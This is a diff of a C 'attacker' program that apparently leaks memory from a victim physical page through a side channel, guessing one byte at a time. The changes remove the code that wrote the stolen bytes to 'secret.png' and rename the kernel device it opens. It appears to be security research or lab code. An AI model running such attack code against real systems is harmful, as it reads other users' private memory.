@@ -85,12 +85,6 @@ int main(int argc, char* argv[]) {
 		printf("./attacker <victim physical page> <victim VA> <# bytes to read> <correct img file>\n");
 		return 1;	
 	}
-
-	int img = creat("secret.png", 0666); // write obtained bytes here
-	if(img < 0) {
-		perror("Failed to create image file.\n");
-		return -1;
-	}
 	
 	uint64_t ppn = strtoul(argv[1], NULL, 16);
 	uint64_t va_addr = strtoul(argv[2], NULL, 16);
@@ -112,7 +106,7 @@ int main(int argc, char* argv[]) {
 	signal(SIGSEGV, catch_segv);
 
 	// open kernel /proc file
-	int fd = open("/dev/pic_kernel", O_WRONLY);
+	int fd = open("/dev/nemo", O_WRONLY);
 	if(fd < 0) {
 		perror("Failed to open /proc file.\n");
 		return -1;
@@ -171,7 +165,7 @@ int main(int argc, char* argv[]) {
 				max = scores[i];
 			}
 		}
-		if(c < 10) printf("%i) my guess %02x\n", c, guess);		
+		if(c < 10) printf("%i) my guess %c\n", c, guess);		
 
 		if(file) {
 			if(guess == pic_bytes[c]) correct++;
@@ -186,8 +180,6 @@ int main(int argc, char* argv[]) {
 			}
 		}
 				
-		write(img, &guess, 1); // write byte to file
-
 		victim_addr++; // move to next char
 		if(c % 512 == 0) {
 			end = clock();
@@ -202,7 +194,6 @@ int main(int argc, char* argv[]) {
 	
 	printf("Total time elapsed: %.2f seconds.\n", total_time);
 	
-	close(img);
 	close(fd);
 	
 	return 0;
